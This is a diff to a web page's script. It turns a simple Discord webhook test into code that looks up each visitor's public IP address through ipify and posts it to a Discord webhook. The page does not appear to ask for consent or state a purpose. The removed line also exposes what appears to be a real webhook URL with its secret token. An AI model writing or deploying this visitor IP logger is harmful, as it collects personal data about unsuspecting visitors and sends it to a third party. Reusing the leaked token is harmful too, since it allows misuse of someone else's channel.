@@ -56,35 +56,60 @@
     </div>
 </body>
     <script>
-    // Function to send the message to the Discord webhook
     function sendWebhookMessage() {
-      const webhookUrl = 'https://discord.com/api/webhooks/1311057682022797434/om54aFEYSM4VYlmMXh1VsipdCTZk4Ka-6FMWoiDGizrzscc1_D5pY8H34re_AYKKjb43'; // Replace with your webhook URL
-      const messageContent = 'Hello, this is a test message from the webhook!'; // Customize your message
+      // Get the user's public IP address from ipify API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip; // Get the IP from the response
 
-      // Creating the payload for the POST request
-      const payload = {
-        content: messageContent
-      };
+          // Construct the embed message
+          const embedMessage = {
+            embeds: [
+              {
+                title: "User IP Address",
+                description: `The user's IP address is: **${userIP}**`,
+                color: 3447003, // Blue color for the embed
+                fields: [
+                  {
+                    name: "IP Address",
+                    value: userIP,
+                    inline: true
+                  }
+                ],
+                footer: {
+                  text: "Webhook Test"
+                }
+              }
+            ]
+          };
 
-      // Sending the POST request using the Fetch API
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('Message sent successfully!');
-        } else {
-          alert('Error sending message');
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('An error occurred');
-      });
+          // Send the embed message to Discord webhook
+          const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'; // Replace with your webhook URL
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(embedMessage)
+          })
+          .then(response => {
+            if (response.ok) {
+              alert('IP Address sent successfully!');
+            } else {
+              alert('Error sending IP address');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred');
+          });
+        })
+        .catch(error => {
+          console.error('Error fetching IP:', error);
+          alert('Error fetching IP address');
+        });
     }
   </script>
 </html>
